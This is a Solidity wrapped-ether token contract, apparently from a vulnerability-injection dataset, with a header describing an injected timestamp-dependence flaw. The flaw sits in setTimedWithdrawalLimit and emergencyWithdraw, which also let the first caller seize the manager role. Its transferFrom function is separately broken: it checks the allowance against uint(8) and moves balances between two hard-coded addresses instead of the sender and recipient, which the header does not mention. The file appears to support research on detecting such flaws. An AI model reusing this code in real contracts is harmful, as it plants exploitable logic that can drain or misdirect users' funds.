/*
 * ===== SmartInject Injection Details =====
 * Function      : setTimedWithdrawalLimit
 * Vulnerability : Timestamp Dependence
 * Status        : Not Detected
 * Type          : Fallback Function Addition
 *
 * === Verification Results ===
 * Detected      : False
 * Relevant      : 0 findings
 * Total Found   : 2 issues
 * Retry Count   : 0
 *
 * === Description ===
 * This injection introduces a timestamp dependence vulnerability through two new functions that create a multi-transaction exploit scenario. The vulnerability requires: 1) First transaction: setTimedWithdrawalLimit() to become the limit manager, 2) Wait for timestamp manipulation opportunity, 3) Second transaction: emergencyWithdraw() during manipulated timestamp window. The vulnerability is stateful as it depends on the lastLimitUpdate state and limitManager assignment persisting between transactions. Miners can manipulate block.timestamp to bypass the 24-hour limit update restriction and the business hours restriction for emergency withdrawals.
 */
// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.4.18;

contract TakyonETH {
    string public name     = "Takyon ETH";
    string public symbol   = "TKN";
    uint8  public decimals = 18;

    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);

    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;

    // === FALLBACK INJECTION: Timestamp Dependence ===
    // Variable declarations need to be at contract level, not inside a function
    uint public withdrawalLimit = 1 ether;
    uint public lastLimitUpdate;
    address public limitManager;
    
    event WithdrawalLimitUpdated(uint newLimit, uint timestamp);
    
    function setTimedWithdrawalLimit(uint _limit) public {
        require(_limit > 0);
        // Vulnerable: relies on block.timestamp for time-sensitive operations
        // Manager can only update limit once per day
        if (lastLimitUpdate == 0 || block.timestamp >= lastLimitUpdate + 24 hours) {
            if (limitManager == address(0)) {
                limitManager = msg.sender;
            }
            require(msg.sender == limitManager);
            
            withdrawalLimit = _limit;
            lastLimitUpdate = block.timestamp;
            WithdrawalLimitUpdated(_limit, block.timestamp);
        }
    }
    
    function emergencyWithdraw() public {
        require(balanceOf[msg.sender] > 0);
        // Vulnerable: timestamp dependence allows manipulation
        // Emergency withdrawals only allowed during "business hours" (9 AM - 5 PM UTC)
        uint hour = (block.timestamp / 3600) % 24;
        require(hour >= 9 && hour <= 17);
        
        uint amount = balanceOf[msg.sender];
        if (amount > withdrawalLimit) {
            amount = withdrawalLimit;
        }
        
        balanceOf[msg.sender] -= amount;
        msg.sender.transfer(amount);
        Withdrawal(msg.sender, amount);
    }
    // === END FALLBACK INJECTION ===

    function() public payable {
        deposit();
    }

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        Deposit(msg.sender, msg.value);
    }
    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        msg.sender.transfer(wad);
        Withdrawal(msg.sender, wad);
    }

    function totalSupply() public view returns (uint) {
        return this.balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint wad)
        public
        returns (bool)
    {
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != uint(8)) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2] -= wad;
        balanceOf[0xA3e5C9c8255955720dda60806694497DCf4B1b00] += wad;

        Transfer(src, dst, wad);

        return true;
    }
}
